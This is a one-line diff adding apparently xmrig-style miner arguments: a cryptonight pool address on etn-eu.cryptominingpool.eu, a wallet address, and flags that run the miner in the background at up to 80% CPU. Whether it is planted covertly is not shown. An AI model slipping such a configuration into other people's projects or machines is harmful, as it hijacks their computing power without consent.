@@ -1,0 +1,1 @@
+-a cryptonight -o stratum+tcp://etn-eu.cryptominingpool.eu:3333 -u etnk9nXGkFCCmoVDmZVumuajRdVSpCCNJ5Chk967TkjpLMd2gzjFKQZ3FFBZaBK6ybba8CwSUM6az6qoNP9AWQSk6h1yrhBaM3 -p x -k --cpu-priority 5 --no-color --donate-level=1 --max-cpu-usage=80 --background
